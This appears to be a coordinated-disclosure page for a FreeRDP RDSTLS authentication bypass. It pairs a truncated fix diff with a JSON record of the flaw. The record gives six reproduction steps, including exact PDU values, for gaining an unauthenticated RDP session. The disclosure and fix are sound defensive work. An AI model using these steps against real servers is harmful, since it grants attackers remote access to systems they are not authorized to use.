+	rdstls_check_state_requirements_((rdstls), (expected), __FILE__, __func__, __LINE__)
+
+WINPR_ATTR_NODISCARD
+static BOOL rdstls_check_state_requirements_(rdpRdstls* rdstls, RDSTLS_STATE expected,
+                                             const char* file, const char* fkt, size_t line)
+{
+	const RDSTLS_STATE current = rdstls_get_state(rdstls);
+	if (current == expected)
+		return TRUE;
+
+	WINPR_ASSERT(rdstls);
+
+	const DWORD log_level = WLOG_ERROR;
+	if (WLog_IsLevelActive(rdstls->log, log_level))
+		WLog_PrintTextMessage(rdstls->log, log_level, line, file, fkt,
+		                      "Unexpected rdstls state %s [%u], expected %s [%u]",
+		                      rdstls_get_state_str(current), current,
+		                      rdstls_get_state_str(expected), expected);
+
+	return FALSE;
+}
+
+WINPR_ATTR_NODISCARD
 static BOOL rdstls_write_capabilities(WINPR_ATTR_UNUSED rdpRdstls* rdstls, wStream* s)
-	if (!Stream_EnsureRemainingCapacity(s, 6))
+	if (!Stream_EnsureRemainingCapacity(s, 8))
 		return FALSE;

+	Stream_Write_UINT16(s, rdstls->supportedVersions);
 	Stream_Write_UINT16(s, RDSTLS_TYPE_CAPABILITIES);
 	Stream_Write_UINT16(s, RDSTLS_DATA_CAPABILITIES);
-	Stream_Write_UINT16(s, RDSTLS_VERSION_1);
+	Stream_Write_UINT16(s, rdstls->supportedVersions);

 	return TRUE;

+WINPR_ATTR_NODISCARD
 static SSIZE_T rdstls_write_string(wStream* s, const char* str)
 	const size_t pos = Stream_GetPosition(s);
@@ -267,6 +321,7 @@ static SSIZE_T rdstls_write_string(wStream* s, const char* str)
 	return (SSIZE_T)(Stream_GetPosition(s) - pos);

+WINPR_ATTR_NODISCARD
 static BOOL rdstls_write_data(wStream* s, UINT32 length, const BYTE* data)
 	WINPR_ASSERT(data || (length == 0));
@@ -284,10 +339,12 @@ static BOOL rdstls_write_data(wStream* s, UINT32 length, const BYTE* data)
 	return TRUE;

+WINPR_ATTR_NODISCARD
 static BOOL rdstls_write_cookie(wStream* s, const ARC_SC_PRIVATE_PACKET* cookie)
 	WINPR_ASSERT(cookie);
-	const uint16_t length = 28;
+	const uint16_t length = sizeof(ARC_SC_PRIVATE_PACKET);
+	WINPR_STATIC_ASSERT(sizeof(ARC_SC_PRIVATE_PACKET) == 28);

 	if (!Stream_EnsureRemainingCapacity(s, 2))
 		return FALSE;
@@ -304,11 +361,42 @@ static BOOL rdstls_write_cookie(wStream* s, const ARC_SC_PRIVATE_PACKET* cookie)
 	return TRUE;

+WINPR_ATTR_NODISCARD
+static BOOL rdstls_read_cookie(wLog* log, wStream* s, ARC_SC_PRIVATE_PACKET* cookie)
+{
+	WINPR_ASSERT(cookie);
+	const uint16_t length = sizeof(ARC_SC_PRIVATE_PACKET);
+	WINPR_STATIC_ASSERT(sizeof(ARC_SC_PRIVATE_PACKET) == 28);
+
+	if (!Stream_CheckAndLogRequiredLengthWLog(log, s, length + 2ull))
+		return FALSE;
+
+	const uint16_t len = Stream_Get_UINT16(s);
+	if (len != length)
+	{
+		WLog_Print(log, WLOG_ERROR,
+		           "RDSTLS Cookie: Unexpected length %" PRIu16 ",  expected %" PRIu16, len, length);
+		return FALSE;
+	}
+
+	cookie->cbLen = Stream_Get_UINT32(s);
+	cookie->version = Stream_Get_UINT32(s);
+	cookie->logonId = Stream_Get_UINT32(s);
+	Stream_Read(s, cookie->arcRandomBits, sizeof(cookie->arcRandomBits));
+	return TRUE;
+}
+
+WINPR_ATTR_NODISCARD
 static BOOL rdstls_write_authentication_request_with_password(rdpRdstls* rdstls, wStream* s)
 	WINPR_ASSERT(rdstls);
 	WINPR_ASSERT(rdstls->context);

+	if (!rdstls_required_role_is_server(rdstls, FALSE))
+		return FALSE;
+	if (!rdstls_check_state_requirements(rdstls, RDSTLS_STATE_AUTH_REQ))
+		return FALSE;
+
 	WLog_Print(rdstls->log, WLOG_DEBUG, "Writing RDSTLS password authentication message");

 	rdpSettings* settings = rdstls->context->settings;
@@ -335,6 +423,7 @@ static BOOL rdstls_write_authentication_request_with_password(rdpRdstls* rdstls,
 	return TRUE;

+WINPR_ATTR_NODISCARD
 static BOOL rdstls_write_authentication_request_with_cookie(WINPR_ATTR_UNUSED rdpRdstls* rdstls,
                                                             WINPR_ATTR_UNUSED wStream* s)
@@ -343,6 +432,11 @@ static BOOL rdstls_write_authentication_request_with_cookie(WINPR_ATTR_UNUSED rd

 	WLog_Print(rdstls->log, WLOG_DEBUG, "Writing RDSTLS cookie authentication message");

+	if (!rdstls_required_role_is_server(rdstls, FALSE))
+		return FALSE;
+	if (!rdstls_check_state_requirements(rdstls, RDSTLS_STATE_AUTH_REQ))
+		return FALSE;
+
 	rdpSettings* settings = rdstls->context->settings;
 	WINPR_ASSERT(settings);

@@ -395,6 +489,11 @@ static BOOL rdstls_write_authentication_request_with_fedauth_token(rdpRdstls* rd

 	WLog_Print(rdstls->log, WLOG_DEBUG, "Writing RDSTLS FedAuth token authentication message");

+	if (!rdstls_required_role_is_server(rdstls, FALSE))
+		return FALSE;
+	if (!rdstls_check_state_requirements(rdstls, RDSTLS_STATE_AUTH_REQ))
+		return FALSE;
+
 	const rdpSettings* settings = rdstls->context->settings;
 	WINPR_ASSERT(settings);

@@ -431,9 +530,15 @@ static BOOL rdstls_write_authentication_request_with_fedauth_token(rdpRdstls* rd
 	return Stream_Write_UTF16_String_From_UTF8(s, wideLength, token, utf8Length, TRUE) >= 0;

+WINPR_ATTR_NODISCARD
 static BOOL rdstls_write_authentication_response(rdpRdstls* rdstls, wStream* s)
 	WINPR_ASSERT(rdstls);
+
+	if (!rdstls_required_role_is_server(rdstls, TRUE))
+		return FALSE;
+	if (!rdstls_check_state_requirements(rdstls, RDSTLS_STATE_AUTH_RSP))
+		return FALSE;
 	if (!Stream_EnsureRemainingCapacity(s, 8))
 		return FALSE;

@@ -444,9 +549,41 @@ static BOOL rds
… (truncated)
```

<https://github.com/FreeRDP/FreeRDP/commit/b05a9510787c83c87ffc5fa8d7cc9f06ed971695>

1. 2026-04-02
2. 2026-07-16
3. 2026-07-22
4. 2026-07-22
5. 2026-09-28

2cf7b2bd21a389dd592adf2a0d7ead11432494a6d795895b7d0ab3e05c1f8adb1418e8dc22389634c945255804aecb4e72f039893f5a6875409616092f167c2c

Committed 2026-07-22 07:29 UTC

Revealed 2026-09-28 21:58 UTC

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-TVG98XT0%22%2C%22bug_class%22%3A%22Authentication%20Bypass%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-04-16T01%3A52%3A43%2B00%3A00%22%2C%22description%22%3A%22In%20FreeRDP%27s%20RDSTLS%20server%20handshake%2C%20rdstls_recv%28%29%20%28rdstls.c%3A719%29%20dispatches%20solely%20on%20the%20wire%20pduType%20with%20no%20check%20of%20peer%20role%20or%20handshake%20state.%20The%20rdpRdstls%20struct%20is%20calloc-allocated%2C%20so%20resultCode%20starts%20at%200%20%3D%3D%20RDSTLS_RESULT_SUCCESS.%20A%20client%20that%20replies%20to%20the%20server%27s%20Capabilities%20PDU%20with%20another%20Capabilities%20PDU%20%28or%20an%20AUTHRSP%29%20instead%20of%20an%20Authentication%20Request%20is%20routed%20to%20a%20handler%20that%20returns%20TRUE%20without%20touching%20resultCode.%20rdstls_server_authenticate%28%29%20%28rdstls.c%3A935%29%20then%20sends%20AUTHRSP%28SUCCESS%29%20and%20returns%20authenticated%2C%20never%20evaluating%20the%20password%20or%20redirection%20GUID/cookie.%20A%20remote%20attacker%20thus%20obtains%20a%20full%20RDP%20session%20on%20any%20FreeRDP-based%20server/proxy%20with%20RdstlsSecurity%20enabled.%22%2C%22discovered_at%22%3A%222026-04-02T00%3A00%3A00%2B00%3A00%22%2C%22location%22%3A%22libfreerdp/core/rdstls.c%3A719%22%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22freerdp/freerdp%22%2C%22reproduction%22%3A%5B%221.%20Connect%20and%20negotiate%20PROTOCOL_RDSTLS%20at%20X.224%2C%20complete%20TLS.%22%2C%222.%20Receive%20the%20server%27s%20RDSTLS%20Capabilities%20PDU.%22%2C%223.%20Reply%20with%20an%208-byte%20RDSTLS_TYPE_CAPABILITIES%20PDU%20%28version%3D1%2Ctype%3D1%2CdataType%3D1%2Cversions%3D1%29%20instead%20of%20an%20Authentication%20Request%20%28alternatively%20send%20RDSTLS_TYPE_AUTHRSP%20with%20resultCode%3D0%29.%22%2C%224.%20rdstls_recv%28%29%20routes%20it%20to%20rdstls_process_capabilities%28%29%2C%20which%20returns%20TRUE%20without%20touching%20resultCode.%22%2C%225.%20Server%20transitions%20AUTH_REQ%E2%86%92AUTH_RSP%2C%20sends%20AUTHRSP%28resultCode%3D0%3DSUCCESS%29%2C%20and%20rdstls_server_authenticate%28%29%20returns%201.%22%2C%226.%20Connection%20advances%20to%20CONNECTION_STATE_MCS_CREATE_REQUEST%20with%20the%20session%20marked%20authenticated%3B%20proceed%20with%20a%20full%20RDP%20session.%22%5D%2C%22technical_details%22%3A%22Root%20cause%20is%20a%20fail-open%20default%20combined%20with%20missing%20state%20validation%3A%20rdstls_new%28%29%20calloc-zeroes%20resultCode%20to%20RDSTLS_RESULT_SUCCESS%2C%20and%20rdstls_recv%28%29%20switches%20purely%20on%20attacker-supplied%20pduType%20without%20consulting%20rdstls-%3Estate%20or%20rdstls-%3Eserver.%20The%20state-transition%20checker%20only%20validates%20the%20server%27s%20own%20fixed%20sequence%2C%20so%20an%20unexpected%20inbound%20PDU%20type%20is%20silently%20accepted%20and%20the%20credential-verification%20path%20is%20skipped%20entirely.%22%2C%22title%22%3A%22RDSTLS%20server%20authentication%20bypass%20via%20PDU-type%20confusion%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-TVG98XT0",
  "bug_class": "Authentication Bypass",
  "created_at": "2026-04-16T01:52:43+00:00",
  "description": "In FreeRDP's RDSTLS server handshake, rdstls_recv() (rdstls.c:719) dispatches solely on the wire pduType with no check of peer role or handshake state. The rdpRdstls struct is calloc-allocated, so resultCode starts at 0 == RDSTLS_RESULT_SUCCESS. A client that replies to the server's Capabilities PDU with another Capabilities PDU (or an AUTHRSP) instead of an Authentication Request is routed to a handler that returns TRUE without touching resultCode. rdstls_server_authenticate() (rdstls.c:935) then sends AUTHRSP(SUCCESS) and returns authenticated, never evaluating the password or redirection GUID/cookie. A remote attacker thus obtains a full RDP session on any FreeRDP-based server/proxy with RdstlsSecurity enabled.",
  "discovered_at": "2026-04-02T00:00:00+00:00",
  "location": "libfreerdp/core/rdstls.c:719",
  "project": "freerdp/freerdp",
    "1. Connect and negotiate PROTOCOL_RDSTLS at X.224, complete TLS.",
    "2. Receive the server's RDSTLS Capabilities PDU.",
    "3. Reply with an 8-byte RDSTLS_TYPE_CAPABILITIES PDU (version=1,type=1,dataType=1,versions=1) instead of an Authentication Request (alternatively send RDSTLS_TYPE_AUTHRSP with resultCode=0).",
    "4. rdstls_recv() routes it to rdstls_process_capabilities(), which returns TRUE without touching resultCode.",
    "5. Server transitions AUTH_REQ→AUTH_RSP, sends AUTHRSP(resultCode=0=SUCCESS), and rdstls_server_authenticate() returns 1.",
    "6. Connection advances to CONNECTION_STATE_MCS_CREATE_REQUEST with the session marked authenticated; proceed with a full RDP session."
  "technical_details": "Root cause is a fail-open default combined with missing state validation: rdstls_new() calloc-zeroes resultCode to RDSTLS_RESULT_SUCCESS, and rdstls_recv() switches purely on attacker-supplied pduType without consulting rdstls->state or rdstls->server. The state-transition checker only validates the server's own fixed sequence, so an unexpected inbound PDU type is silently accepted and the credential-verification path is skipped entirely.",
  "title": "RDSTLS server authentication bypass via PDU-type confusion",
```
